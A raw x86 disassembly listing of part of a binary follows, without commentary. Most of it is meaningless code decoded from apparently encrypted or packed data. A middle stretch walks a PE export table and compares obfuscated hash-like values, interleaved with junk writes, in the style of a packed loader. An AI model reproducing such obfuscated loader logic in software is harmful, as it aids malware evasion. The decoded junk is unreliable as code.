  40ce01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce02:	cld    
  40ce03:	push   cs
  40ce04:	repnz or eax,0xffed4a81
  40ce0a:	inc    eax
  40ce0b:	lahf   
  40ce0c:	jae    0x40cdd7
  40ce0e:	fwait
  40ce0f:	dec    esp
  40ce10:	shl    BYTE PTR [esi+ecx*8-0x47],0x73
  40ce15:	jae    0x40cdb8
  40ce17:	jns    0x40ce6b
  40ce19:	cdq    
  40ce1a:	in     al,dx
  40ce1b:	icebp  
  40ce1c:	mov    ebx,0x6986710c
  40ce21:	sbb    eax,0xadf56f9d
  40ce26:	pop    esi
  40ce27:	jecxz  0x40cde6
  40ce29:	out    0xee,eax
  40ce2b:	sbb    BYTE PTR [ebx+0x3f],cl
  40ce2e:	addr16 fdivp st(6),st
  40ce31:	clc    
  40ce32:	sub    dl,BYTE PTR [ebp-0x7e7d9553]
  40ce38:	loop   0x40cdfd
  40ce3a:	mov    bl,0xf3
  40ce3c:	lock popa 
  40ce3e:	ss adc eax,0x1fe03856
  40ce44:	enter  0x388,0x3d
  40ce48:	jmp    DWORD PTR [edi*8+0x673eff4c]
  40ce4f:	dec    edi
  40ce50:	sub    ch,bl
  40ce52:	clc    
  40ce53:	out    dx,eax
  40ce54:	jo     0x40ce01
  40ce56:	adc    DWORD PTR [edx-0x33],0xffffffb1
  40ce5a:	fist   WORD PTR [edi]
  40ce5c:	mov    esi,0x9ab702ea
  40ce61:	xor    eax,0x61a6ec93
  40ce67:	and    dh,BYTE PTR [ecx]
  40ce69:	pop    ds
  40ce6a:	mov    ebx,0xeb36b9f4
  40ce6f:	mov    al,ds:0xce4b1ce7
  40ce74:	xlat   BYTE PTR ds:[ebx]
  40ce75:	adc    edx,ebp
  40ce77:	cmp    eax,0xa7714d42
  40ce7c:	lea    esi,[ebp+ebp*8-0x3ff283a5]
  40ce83:	xchg   esp,eax
  40ce84:	stos   BYTE PTR es:[edi],al
  40ce85:	cmp    ebx,esi
  40ce87:	out    dx,eax
  40ce88:	or     DWORD PTR [eax],ecx
  40ce8a:	mov    ch,0x28
  40ce8c:	add    DWORD PTR [ebx-0xcc76704],ebp
  40ce92:	aaa    
  40ce93:	fist   WORD PTR [ebp+0x1e]
  40ce96:	jg     0x40ceee
  40ce98:	sti    
  40ce99:	fsub   QWORD PTR [ecx+0x24]
  40ce9c:	iret   
  40ce9d:	pop    esi
  40ce9e:	sti    
  40ce9f:	or     eax,0x2e5d856d
  40cea4:	fs add eax,0x30d99b20
  40ceaa:	jno    0x40ce87
  40ceac:	sub    edi,DWORD PTR [esi+eiz*4+0x1b7996a0]
  40ceb3:	inc    esp
  40ceb4:	das    
  40ceb5:	and    BYTE PTR [edi],dh
  40ceb7:	stc    
  40ceb8:	das    
  40ceb9:	js     0x40ce66
  40cebb:	jecxz  0x40cf0e
  40cebd:	(bad)  
  40cebe:	neg    DWORD PTR [edx-0x50]
  40cec1:	mov    ds:0xb84ec053,al
  40cec6:	push   ecx
  40cec7:	pop    eax
  40cec8:	jl     0x40ce51
  40ceca:	dec    eax
  40cecb:	inc    ebx
  40cecc:	cmc    
  40cecd:	cs stos DWORD PTR es:[edi],eax
  40cecf:	inc    ecx
  40ced0:	popf   
  40ced1:	push   ss
  40ced2:	cld    
  40ced3:	jmp    DWORD PTR [edi-0x109b5ca5]
  40ced9:	inc    ebp
  40ceda:	std    
  40cedb:	or     eax,0x5a2e498a
  40cee0:	idiv   DWORD PTR [ecx+ecx*8-0x68]
  40cee4:	in     eax,0xf8
  40cee6:	cmp    esi,DWORD PTR [edx]
  40cee8:	lock jg 0x40cf47
  40ceeb:	adc    ah,0xd4
  40ceee:	cmp    al,cl
  40cef0:	inc    ebp
  40cef1:	sbb    esp,DWORD PTR [ebx]
  40cef3:	wbnoinvd 
  40cef6:	sar    ch,1
  40cef8:	int3   
  40cef9:	stos   DWORD PTR es:[edi],eax
  40cefa:	imul   ecx,DWORD PTR ds:0x5765dfe6,0x6c
  40cf01:	jns    0x40cf03
  40cf03:	xor    al,0x2b
  40cf05:	sbb    ch,BYTE PTR [edx+ecx*4]
  40cf08:	div    DWORD PTR [esi+esi*1-0x70a9aad6]
  40cf0f:	mov    ebx,DWORD PTR [eax]
  40cf11:	xlat   BYTE PTR ds:[ebx]
  40cf12:	outs   dx,DWORD PTR ds:[esi]
  40cf13:	mov    ds:0x2d789b11,al
  40cf18:	(bad)  
  40cf19:	retf   
  40cf1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf1b:	sub    al,0xeb
  40cf1d:	popa   
  40cf1e:	clc    
  40cf1f:	mov    eax,0x5f2ba296
  40cf24:	lods   eax,DWORD PTR ds:[esi]
  40cf25:	jl     0x40cf77
  40cf27:	(bad)  
  40cf28:	int    0x83
  40cf2a:	sub    ch,ch
  40cf2c:	dec    edi
  40cf2d:	pop    edi
  40cf2e:	call   0xbc7318a
  40cf33:	xchg   DWORD PTR [edi-0x1b8887cc],edx
  40cf39:	mov    dl,0x18
  40cf3b:	sbb    cl,ch
  40cf3d:	cmp    dh,BYTE PTR [eax-0x1c]
  40cf40:	xchg   edx,eax
  40cf41:	je     0x40cf6c
  40cf43:	pop    edi
  40cf44:	cmp    DWORD PTR [edi+0x4d2505e6],ecx
  40cf4a:	push   esp
  40cf4b:	std    
  40cf4c:	dec    ebp
  40cf4d:	bound  eax,QWORD PTR [ecx+edi*4]
  40cf50:	fild   WORD PTR [ebx+0x4d]
  40cf53:	xor    al,0x4b
  40cf55:	ret    
  40cf56:	adc    al,BYTE PTR [esi-0x3f]
  40cf59:	leave  
  40cf5a:	sbb    eax,0x301f6da8
  40cf5f:	fsub   DWORD PTR [esi]
  40cf61:	and    ebx,edx
  40cf63:	pop    ebx
  40cf64:	fnstsw WORD PTR ds:0xee64eea
  40cf6a:	aaa    
  40cf6b:	pop    ebx
  40cf6c:	mov    bl,0x82
  40cf6e:	xor    eax,0x4810d11d
  40cf73:	int3   
  40cf74:	xchg   edx,eax
  40cf75:	pop    esp
  40cf76:	ins    BYTE PTR es:[di],dx
  40cf78:	or     eax,ecx
  40cf7a:	add    bh,BYTE PTR [ebx]
  40cf7c:	mov    eax,0x6d98c7d5
  40cf81:	jge    0x40cf91
  40cf83:	call   FWORD PTR [esi-0x25]
  40cf86:	loopne 0x40cf10
  40cf88:	cmp    edi,DWORD PTR [esi-0x32]
  40cf8b:	dec    edi
  40cf8c:	out    dx,eax
  40cf8d:	jbe    0x40cf32
  40cf8f:	mov    edi,0x85b3bcc2
  40cf94:	sbb    ebx,esi
  40cf96:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf98:	out    0xb7,eax
  40cf9a:	dec    edi
  40cf9b:	sub    eax,DWORD PTR [ebp+0xf]
  40cf9e:	cdq    
  40cf9f:	(bad)  
  40cfa0:	mov    esp,0x7aa78f63
  40cfa5:	lods   eax,DWORD PTR ds:[esi]
  40cfa6:	or     al,BYTE PTR [eax-0x65]
  40cfa9:	sub    eax,0xf993b0a
  40cfae:	jl     0x40d025
  40cfb0:	test   eax,0xadf42f24
  40cfb5:	scas   eax,DWORD PTR es:[edi]
  40cfb6:	out    0xa,al
  40cfb8:	fstp   DWORD PTR [ebx+ecx*1]
  40cfbb:	cli    
  40cfbc:	cmp    DWORD PTR [ecx-0xd11859e],ebp
  40cfc2:	inc    ebx
  40cfc3:	fcmovne st,st(2)
  40cfc5:	jb     0x40cf6e
  40cfc7:	dec    esp
  40cfc8:	add    al,0xac
  40cfca:	and    ah,BYTE PTR [eax+0x6b]
  40cfcd:	add    DWORD PTR [edi-0x74],ebp
  40cfd0:	stc    
  40cfd1:	sbb    BYTE PTR [ebx],bl
  40cfd3:	jecxz  0x40cfdb
  40cfd5:	adc    al,BYTE PTR [ebx]
  40cfd7:	pop    ss
  40cfd8:	out    0x42,al
  40cfda:	fwait
  40cfdb:	sbb    al,0xe3
  40cfdd:	inc    edi
  40cfde:	mov    ebx,0x9745009e
  40cfe3:	xchg   edx,eax
  40cfe4:	fs out 0x9a,eax
  40cfe7:	xchg   DWORD PTR ds:0x1ae75278,eax
  40cfed:	pusha  
  40cfee:	mov    eax,0x5fe3041
  40cff3:	inc    edx
  40cff4:	xchg   edi,eax
  40cff5:	hlt    
  40cff6:	scas   eax,DWORD PTR es:[edi]
  40cff7:	cmp    esi,esp
  40cff9:	shl    BYTE PTR [edi],cl
  40cffb:	andps  xmm6,xmm3
  40cffe:	dec    esi
  40cfff:	popa   
  40d000:	push   ds
  40d001:	dec    di
  40d003:	bound  eax,QWORD PTR [eax]
  40d005:	inc    edi
  40d006:	sbb    eax,0x87bbc8f2
  40d00b:	adc    bh,BYTE PTR [esi-0x45]
  40d00e:	xor    ecx,DWORD PTR [esi-0x5d]
  40d011:	or     ecx,esi
  40d013:	jmp    0x909c749c
  40d018:	cmp    eax,0x2817abfa
  40d01d:	cmp    BYTE PTR [ebx-0x60],ah
  40d020:	je     0x40cfee
  40d022:	pushf  
  40d023:	cmp    BYTE PTR [edi+0x21eaf6c5],dh
  40d029:	sub    BYTE PTR [edx*2+0xd7d3675],dh
  40d030:	pop    es
  40d031:	xchg   edi,eax
  40d033:	cdq    
  40d034:	dec    eax
  40d035:	sar    ch,0xed
  40d038:	in     eax,dx
  40d039:	dec    esi
  40d03a:	aad    0xb5
  40d03c:	pop    esi
  40d03d:	cdq    
  40d03e:	push   ss
  40d03f:	xchg   ecx,eax
  40d040:	mov    ebx,0xd0f80a52
  40d045:	and    ebx,DWORD PTR [edi]
  40d047:	in     eax,0xa8
  40d049:	or     DWORD PTR [ebp+0x41bc3c89],0x8e3107ea
  40d053:	rcr    BYTE PTR [edx],cl
  40d055:	int    0x53
  40d057:	adc    edx,edi
  40d059:	jns    0x40d054
  40d05b:	cli    
  40d05c:	out    0x6e,al
  40d05e:	mov    ds:0x872f6fa2,al
  40d063:	mov    ecx,DWORD PTR [ebp+0x8]
  40d066:	sbb    DWORD PTR ds:0x42a2b6,0x42a2d2
  40d070:	add    ecx,DWORD PTR [eax+0x24]
  40d073:	and    DWORD PTR ds:0x42a2de,0x1336
  40d07d:	mov    DWORD PTR [ebp-0x34],ecx
  40d080:	mov    eax,DWORD PTR [ebp-0x14]
  40d083:	mov    ecx,DWORD PTR [ebp+0x8]
  40d086:	add    DWORD PTR ds:0x42a276,0x42a2a6
  40d090:	add    ecx,DWORD PTR [eax+0x1c]
  40d093:	mov    DWORD PTR ds:0x42a2ae,0x5cb0
  40d09d:	mov    DWORD PTR [ebp-0x14],ecx
  40d0a0:	mov    DWORD PTR ds:0x42a2f2,0x755c
  40d0aa:	jmp    0x40d194
  40d0af:	or     eax,ecx
  40d0b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40d0b4:	xor    ecx,0x90a
  40d0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40d0bd:	adc    DWORD PTR ds:0x42a28e,0x25cc
  40d0c7:	add    ecx,DWORD PTR [eax+ebx*4]
  40d0ca:	mov    DWORD PTR [ebp-0x28],ecx
  40d0cd:	xor    eax,0x75c
  40d0d2:	mov    eax,DWORD PTR [ebp-0x4]
  40d0d5:	mov    ecx,DWORD PTR [ebp-0x28]
  40d0d8:	xor    eax,esi
  40d0da:	and    DWORD PTR ds:0x42a2ae,0x42a2c2
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ea,0x1030
  40d0f0:	cmp    ecx,eax
  40d0f2:	mov    DWORD PTR ds:0x42a2c6,0xfb7
  40d0fc:	je     0x40d194
  40d102:	mov    DWORD PTR ds:0x42a262,0xed5
  40d10c:	jmp    0x40d185
  40d111:	and    DWORD PTR ds:0x42a2e2,0x0
  40d11b:	jmp    0x40d12d
  40d120:	mov    ecx,DWORD PTR ds:0x42a2e2
  40d126:	inc    ecx
  40d127:	mov    DWORD PTR ds:0x42a2e2,ecx
  40d12d:	cmp    DWORD PTR ds:0x42a2e2,0x10
  40d134:	jae    0x40d161
  40d13a:	cmp    DWORD PTR ds:0x42a2e2,0x15
  40d141:	jle    0x40d161
  40d147:	jmp    0x40d15c
  40d14c:	push   0x42a2ae
  40d151:	push   0x429181
  40d156:	call   DWORD PTR ds:0x42a3ca
  40d15c:	jmp    0x40d120
  40d161:	mov    eax,DWORD PTR [ebp-0x4]
  40d164:	mov    ecx,DWORD PTR [ebp-0x8]
  40d167:	xor    eax,esi
  40d169:	add    eax,edi
  40d16b:	cmp    ecx,eax
  40d16d:	mov    eax,DWORD PTR [ebp-0x4]
  40d170:	je     0x40d1cf
  40d176:	mov    ecx,DWORD PTR [ebp-0x30]
  40d179:	xor    eax,esi
  40d17b:	add    eax,edi
  40d17d:	cmp    ecx,eax
  40d17f:	je     0x40d1d8
  40d185:	lea    eax,[ebp-0x8]
  40d188:	push   eax
  40d189:	push   DWORD PTR [ebp-0x28]
  40d18c:	push   DWORD PTR [ebp+0xc]
  40d18f:	call   0x41622a
  40d194:	mov    eax,DWORD PTR [ebp-0x4]
  40d197:	mov    ecx,DWORD PTR [ebp-0x8]
  40d19a:	xor    eax,esi
  40d19c:	add    eax,edi
  40d19e:	cmp    ecx,eax
  40d1a0:	je     0x40d1bb
  40d1a6:	mov    eax,DWORD PTR [ebp-0x34]
  40d1a9:	movzx  eax,WORD PTR [eax+ebx*2]
  40d1ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40d1b0:	mov    eax,DWORD PTR [ecx+eax*4]
  40d1b3:	mov    DWORD PTR [ebp-0x38],eax
  40d1b6:	jmp    0x40d111
  40d1bb:	mov    eax,DWORD PTR [ebp-0xc]
  40d1be:	xor    eax,esi
  40d1c0:	lea    ebx,[ebx+eax*1+0x3272f1]
  40d1c7:	jmp    0x40872d
  40d1cc:	mov    eax,DWORD PTR [ebp-0x4]
  40d1cf:	xor    eax,esi
  40d1d1:	add    eax,edi
  40d1d3:	jmp    0x413da1
  40d1d8:	mov    eax,DWORD PTR [ebp-0x38]
  40d1db:	add    eax,DWORD PTR [ebp+0x8]
  40d1de:	mov    DWORD PTR [ebp-0x18],eax
  40d1e1:	mov    eax,DWORD PTR [ebp-0x1c]
  40d1e4:	test   eax,eax
  40d1e6:	je     0x40f60e
  40d1ec:	mov    DWORD PTR [ebp-0x20],0x0
  40d1f3:	push   0x3
  40d1f5:	xor    edx,edx
  40d1f7:	pop    edx
  40d1f8:	add    edx,0x8
  40d1fb:	push   edx
  40d1fc:	pop    ecx
  40d1fd:	push   0x6
  40d1ff:	dec    ecx
  40d200:	pop    ebx
  40d201:	dec    ebx
  40d202:	xchg   ebx,ecx
  40d204:	sub    ebx,ecx
  40d206:	xchg   ebx,ecx
  40d208:	dec    ecx
  40d209:	mov    eax,DWORD PTR [ebp-0x1c]
  40d20c:	imul   eax,ecx
  40d20f:	sub    esp,eax
  40d211:	mov    DWORD PTR [ebp-0x20],esp
  40d214:	mov    eax,DWORD PTR [ebp-0x4]
  40d217:	xor    eax,esi
  40d219:	add    eax,edi
  40d21b:	jmp    0x40f5e7
  40d220:	mov    ecx,DWORD PTR [ebp-0xc]
  40d223:	mov    eax,DWORD PTR [ebp+0x8]
  40d226:	mov    edx,DWORD PTR [ebp+0x14]
  40d229:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d22d:	xor    ecx,esi
  40d22f:	add    ecx,edi
  40d231:	xor    edx,edx
  40d233:	div    ecx
  40d235:	mov    ecx,DWORD PTR [ebp-0x4]
  40d238:	jmp    0x40f5c6
  40d23d:	adc    esp,DWORD PTR [eax-0x55]
  40d240:	jl     0x40d1c2
  40d242:	mov    eax,0x95ec0084
  40d247:	bound  ebp,QWORD PTR [ecx-0x2e]
  40d24a:	(bad)  
  40d24b:	mov    al,ds:0x83d3e956
  40d250:	or     DWORD PTR [esi+ebx*2],0xffffff83
  40d254:	or     DWORD PTR [ecx-0x1c],0x39
  40d258:	cmp    eax,0xe2666a80
  40d25d:	and    edi,DWORD PTR [edx-0x35829bfc]
  40d263:	push   ebp
  40d264:	and    DWORD PTR [esi],0x7d113d9f
  40d26a:	out    0xd7,eax
  40d26c:	xchg   ebp,eax
  40d26d:	lods   al,BYTE PTR ds:[esi]
  40d26e:	xor    dh,BYTE PTR [edi-0x60]
  40d271:	and    DWORD PTR [eax-0x56],esi
  40d274:	jmp    0x40d292
  40d276:	mov    ebx,0x14d7f030
  40d27b:	and    al,0xc7
  40d27d:	and    ecx,DWORD PTR [ebp+ecx*1+0x6]
  40d281:	adc    DWORD PTR [ecx],edx
  40d283:	js     0x40d2ca
  40d285:	ror    BYTE PTR [edi+0x51],1
  40d288:	cmc    
  40d289:	dec    edi
  40d28a:	jo     0x40d2aa
  40d28c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d28d:	xor    BYTE PTR [edi-0x3c3da1b1],0x8
  40d294:	inc    edx
  40d295:	fcomip st,st(7)
  40d297:	lea    esp,[esi+0xf]
  40d29a:	ficomp WORD PTR [ebx-0x334b15e4]
  40d2a0:	jno    0x40d311
  40d2a2:	xor    eax,0xcf6206be
  40d2a7:	mov    esp,esp
  40d2a9:	aaa    
  40d2aa:	mov    ecx,DWORD PTR [ebx]
  40d2ac:	mov    BYTE PTR [edi-0x506945ce],0xb2
  40d2b3:	enter  0xc241,0x57
  40d2b7:	pusha  
  40d2b8:	jge    0x40d274
  40d2ba:	jnp    0x40d257
  40d2bc:	cmc    
  40d2bd:	and    al,0xaf
  40d2bf:	mov    DWORD PTR [edi],ebp
  40d2c1:	and    ecx,DWORD PTR [esi+0x33]
  40d2c4:	(bad)  
  40d2c5:	in     eax,dx
  40d2c6:	jg     0x40d308
  40d2c8:	mov    al,0xa1
  40d2ca:	in     al,0xee
  40d2cc:	add    edi,DWORD PTR [edi-0x62]
  40d2cf:	movhps xmm1,QWORD PTR [esi+ebx*8+0x4a]
  40d2d4:	xchg   esp,eax
  40d2d5:	inc    esi
  40d2d6:	mov    BYTE PTR [ecx],ch
  40d2d8:	call   0x88af:0x88a6d982
  40d2df:	not    BYTE PTR [eax]
  40d2e1:	dec    ebx
  40d2e2:	mov    cl,0xd1
  40d2e4:	popf   
  40d2e5:	fptan  
  40d2e7:	iret   
  40d2e8:	push   edx
  40d2e9:	fwait
  40d2ea:	xchg   ecx,eax
  40d2eb:	popa   
  40d2ec:	icebp  
  40d2ed:	adc    eax,0x87cba045
  40d2f2:	cmp    al,0xe7
  40d2f4:	mov    edx,0x821df8f5
  40d2f9:	push   ss
  40d2fa:	jp     0x40d2d5
  40d2fc:	sub    cl,BYTE PTR [ebp-0xf417c65]
  40d302:	jbe    0x40d30b
  40d304:	xor    al,0xbf
  40d306:	mov    ebx,0x2c0d91b
  40d30b:	jbe    0x40d2b9
  40d30d:	dec    edx
  40d30e:	fadd   DWORD PTR [ebp+0x4fdc19e6]
  40d314:	push   0x7ef3920e
  40d319:	dec    DWORD PTR [ebp-0x6b]
  40d31c:	jo     0x40d38f
  40d31e:	(bad)  
  40d31f:	aam    0x82
  40d321:	inc    ebp
  40d322:	ins    DWORD PTR es:[edi],dx
  40d323:	inc    eax
  40d324:	call   0x5484:0x56d8be2a
  40d32b:	lds    ebp,FWORD PTR [edi+0x4e]
  40d32e:	pop    ebx
  40d32f:	(bad)  
  40d330:	jecxz  0x40d2f0
  40d332:	and    BYTE PTR [edx+eiz*1+0x5204c363],dh
  40d339:	cmp    cl,BYTE PTR [eax-0x1fa66a3a]
  40d33f:	sbb    edx,DWORD PTR [edi]
  40d341:	mov    bh,BYTE PTR [ebp+eax*2-0x66]
  40d345:	cmp    esp,DWORD PTR [edi+0x44]
  40d348:	jg     0x40d38f
  40d34a:	and    ah,dh
  40d34c:	popa   
  40d34d:	int    0x9d
  40d34f:	scas   al,BYTE PTR es:[edi]
  40d350:	jle    0x40d2e8
  40d352:	push   ebp
  40d353:	repz je 0x40d333
  40d356:	int    0x7a
  40d358:	hlt    
  40d359:	(bad)  
  40d35a:	int    0x7b
  40d35c:	inc    ebp
  40d35d:	clc    
  40d35e:	mov    ch,0xe3
  40d360:	sub    DWORD PTR [esi+0x2c4afc49],ecx
  40d366:	hlt    
  40d367:	dec    ecx
  40d368:	inc    ebx
  40d369:	xchg   BYTE PTR [ecx],ah
  40d36b:	xchg   ebx,eax
  40d36c:	(bad)  
  40d36d:	sub    dl,ah
  40d36f:	pop    ebx
  40d370:	shl    ebp,cl
  40d372:	lods   eax,DWORD PTR ds:[esi]
  40d373:	push   eax
  40d374:	sbb    edx,edi
  40d376:	and    eax,0x5b12fb50
  40d37b:	icebp  
  40d37c:	addr16 (bad) 
  40d37e:	aam    0x7f
  40d380:	push   ebp
  40d381:	pusha  
  40d382:	xchg   ch,dh
  40d384:	pop    ds
  40d385:	out    0xb5,eax
  40d387:	in     al,dx
  40d388:	mov    ds:0x69bfd68e,eax
  40d38d:	(bad)  
  40d38e:	jmp    0x71fd5b85
  40d393:	scas   eax,DWORD PTR es:[edi]
  40d394:	jo     0x40d33b
  40d396:	outs   dx,DWORD PTR ds:[esi]
  40d397:	seta   BYTE PTR [eax+0xc96b413]
  40d39e:	lods   al,BYTE PTR ds:[esi]
  40d39f:	imul   DWORD PTR [edx-0x359a93f2]
  40d3a5:	mov    ebp,0xf5e18dff
  40d3aa:	sbb    dh,dl
  40d3ac:	mov    ebp,0xea72f00e
  40d3b1:	jle    0x40d425
  40d3b3:	out    0xa1,eax
  40d3b5:	ja     0x40d36a
  40d3b7:	fstp   QWORD PTR [edi+0xad508e4]
  40d3bd:	push   ecx
  40d3be:	jno    0x40d3e4
  40d3c0:	out    0xe7,al
  40d3c2:	sbb    BYTE PTR [edx-0x64],dl
  40d3c5:	pop    esp
  40d3c6:	mov    esp,0x73cbc628
  40d3cb:	(bad)  
  40d3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ce:	fnstenv [edx-0x30813b9c]
  40d3d4:	mov    eax,0x30f782e2
  40d3d9:	(bad)  
  40d3da:	iret   
  40d3db:	aaa    
  40d3dc:	lahf   
  40d3dd:	add    eax,0x1bd341f9
  40d3e2:	jp     0x40d3ae
  40d3e4:	add    DWORD PTR [esi+ebp*1],edx
  40d3e7:	xchg   edi,eax
  40d3e8:	mov    ah,0xb4
  40d3ea:	mov    al,0x85
  40d3ec:	mov    al,ds:0x9a298d8d
  40d3f1:	ds cmc 
  40d3f3:	mov    dh,0x7f
  40d3f5:	rcr    BYTE PTR [edx+0x10f3daf3],cl
  40d3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3fc:	dec    ebx
  40d3fd:	xor    eax,DWORD PTR [edx]
  40d3ff:	pop    esi
  40d400:	mov    esi,0xeb066be9
  40d405:	pop    ebx
  40d406:	xchg   ebx,eax
  40d407:	inc    esp
  40d408:	xchg   esp,eax
  40d409:	gs mov ebx,0xf439802a
  40d40f:	push   edi
  40d410:	or     al,0xd7
  40d412:	js     0x40d485
  40d414:	cmp    eax,0x845a2f42
  40d419:	mov    dl,0x91
  40d41b:	lock adc bh,BYTE PTR ds:[edx+0x79df4f92]
  40d423:	ret    0x216f
  40d426:	into   
  40d427:	xchg   ebx,eax
  40d428:	mov    WORD PTR [esi],es
  40d42a:	stos   DWORD PTR es:[edi],eax
  40d42b:	sub    DWORD PTR [ebx+0x56ee2384],0xa1e32c43
  40d435:	jl     0x40d404
  40d437:	cmp    BYTE PTR [ebx],cl
  40d439:	sar    BYTE PTR [ecx],0xf2
  40d43c:	lea    edi,[edx+ebp*4+0x79]
  40d440:	inc    edx
  40d441:	hlt    
  40d442:	ds sub al,0xab
  40d445:	xor    bh,ah
  40d447:	bound  ebx,QWORD PTR [edi-0x2e]
  40d44a:	or     dh,BYTE PTR [ebx-0x2f8b1d51]
  40d450:	retf   0x41b6
  40d453:	shr    edi,1
  40d455:	in     eax,dx
  40d456:	mov    edi,0xd28bf4a
  40d45b:	arpl   WORD PTR gs:[eax],bx
  40d45e:	xchg   DWORD PTR [esi-0xf],eax
  40d461:	mov    ds:0x16079e3d,eax
  40d466:	pop    ds
  40d467:	add    bl,dh
  40d469:	xchg   esi,eax
  40d46a:	sbb    eax,0xa886c593
  40d46f:	push   edx
  40d470:	test   DWORD PTR [edi],0xb292f9ac
  40d476:	(bad)  
  40d477:	shl    DWORD PTR [ebp-0x32a7950d],cl
  40d47d:	xchg   edi,eax
  40d47e:	pop    ecx
  40d47f:	shl    ah,0xa8
  40d482:	clc    
  40d483:	push   0x58
  40d485:	push   ecx
  40d486:	repz repnz gs push ebx
  40d48a:	stos   BYTE PTR es:[edi],al
  40d48b:	xor    edi,DWORD PTR [edi]
  40d48d:	shl    BYTE PTR [ebp+0x77b4ce07],cl
  40d493:	stos   DWORD PTR es:[edi],eax
  40d494:	mov    ah,0x82
  40d496:	dec    edi
  40d497:	xor    DWORD PTR [eax-0x48890f1d],edx
  40d49d:	cmp    al,0x1
  40d49f:	push   0x35
  40d4a1:	pop    ss
  40d4a2:	pusha  
  40d4a3:	test   esi,ecx
  40d4a5:	xchg   DWORD PTR [edi],edx
  40d4a7:	test   ebp,edi
  40d4a9:	dec    ecx
  40d4aa:	jp     0x40d4dc
  40d4ac:	stos   DWORD PTR es:[edi],eax
  40d4ad:	jmp    0x536e:0x8b4a41f9
  40d4b4:	ins    BYTE PTR es:[edi],dx
  40d4b5:	and    eax,0xd0796be4
  40d4ba:	mov    ecx,0x57be072a
  40d4bf:	dec    esp
  40d4c0:	pushf  
  40d4c1:	sub    BYTE PTR [ebx+0x4fd0806a],cl
  40d4c7:	pop    eax
  40d4c8:	popf   
  40d4c9:	dec    ecx
  40d4ca:	xchg   esp,eax
  40d4cb:	xchg   DWORD PTR [esi],edi
  40d4cd:	cmp    ch,BYTE PTR [ebx+eiz*4]
  40d4d0:	mov    esi,0xeefc8649
  40d4d5:	and    DWORD PTR [ebx],0x49
  40d4d8:	neg    BYTE PTR [edx+0x7b18a6ac]
  40d4de:	fist   DWORD PTR [edi]
  40d4e0:	dec    edi
  40d4e1:	stc    
  40d4e2:	lods   eax,DWORD PTR ds:[esi]
  40d4e3:	xchg   BYTE PTR [esi+0x7c],bl
  40d4e6:	mov    ebp,cs
  40d4e8:	xchg   edi,eax
  40d4e9:	mov    ds:0x7ef3bdd3,al
  40d4ee:	rcl    BYTE PTR [ebx],cl
  40d4f0:	(bad)
  40d4f3:	xchg   BYTE PTR [esi],ch
  40d4f5:	xor    eax,0x21e82a74
  40d4fa:	inc    esp
  40d4fb:	hlt    
  40d4fc:	inc    edi
  40d4fd:	adc    eax,0x31258ad3
  40d502:	xlat   BYTE PTR ds:[ebx]
  40d503:	gs pop eax
  40d505:	scas   eax,DWORD PTR es:[edi]
  40d506:	and    al,BYTE PTR [esi+0x7b]
  40d509:	loope  0x40d54c
  40d50b:	cdq    
  40d50c:	lds    ebx,FWORD PTR [ecx-0x2f]
  40d50f:	xor    al,0xd6
  40d511:	mov    edx,0xa5479f96
  40d516:	or     al,0xaa
  40d518:	loopne 0x40d529
  40d51a:	sbb    BYTE PTR [eax-0x48228537],ah
  40d520:	add    cl,ch
  40d522:	mov    BYTE PTR [edx-0x71309919],dh
  40d528:	sbb    al,0xd2
  40d52a:	inc    esi
  40d52b:	inc    eax
  40d52c:	mov    edx,edx
  40d52e:	mov    ecx,0x2bb5210c
  40d533:	(bad)  
  40d534:	or     BYTE PTR [esi-0x20],ah
  40d537:	dec    ebx
  40d538:	adc    bh,BYTE PTR [edi+0x51ea0a2d]
  40d53e:	jmp    0x58c5:0x8b96e2c7
  40d545:	rcl    DWORD PTR [edi-0x6d],cl
  40d548:	and    eax,0x8df94324
  40d54d:	mov    al,0x6
  40d54f:	pop    edx
  40d550:	cmp    eax,DWORD PTR [eax]
  40d552:	aad    0x31
  40d554:	imul   edi,DWORD PTR [edx],0x52943cb4
  40d55a:	repnz sbb ebx,eax
  40d55d:	aaa    
  40d55e:	sub    al,0x3c
  40d560:	sub    eax,0x90d219de
  40d565:	add    ebx,DWORD PTR [edx+eax*8+0x21c656a9]
  40d56c:	sbb    DWORD PTR [edx-0x20],ebp
  40d56f:	(bad)  
  40d570:	mov    cl,0x3a
  40d572:	xchg   edi,eax
  40d573:	xor    al,0x86
  40d575:	std    
  40d576:	inc    edx
  40d577:	pop    esp
  40d578:	ins    DWORD PTR es:[edi],dx
  40d579:	lods   eax,DWORD PTR ds:[esi]
  40d57a:	cmp    DWORD PTR [edx+eiz*8-0x23],eax
  40d57e:	xor    BYTE PTR [ecx-0x70e7530c],0xce
  40d585:	pop    ebx
  40d586:	or     WORD PTR [edi+0x2c],dx
  40d58a:	add    DWORD PTR [ebp+0x38],ebx
  40d58d:	ror    BYTE PTR [edi-0x11],0xf7
  40d591:	push   0x1a
  40d593:	cmc    
  40d594:	xchg   ecx,eax
  40d595:	scas   eax,DWORD PTR es:[edi]
  40d596:	mov    ax,ds:0x69a27306
  40d59c:	pop    esi
  40d59d:	mov    ds:0x55aa2e40,al
  40d5a2:	in     eax,dx
  40d5a3:	cmp    eax,0xf0475e7a
  40d5a8:	ss out 0xbf,eax
  40d5ab:	pop    edi
  40d5ac:	pop    ds
  40d5ad:	push   ecx
  40d5ae:	loop   0x40d544
  40d5b0:	and    ch,BYTE PTR [ebx+edx*4-0x7f4fcf59]
  40d5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5b8:	jmp    FWORD PTR [eax]
  40d5ba:	adc    eax,0x98a16fca
  40d5bf:	into   
  40d5c0:	push   eax
  40d5c1:	fmul   st,st(7)
  40d5c3:	add    esi,ebp
  40d5c5:	hlt    
  40d5c6:	pop    ebp
  40d5c7:	fsubr  DWORD PTR es:[edi-0x7b5ae9f]
  40d5ce:	scas   eax,DWORD PTR es:[edi]
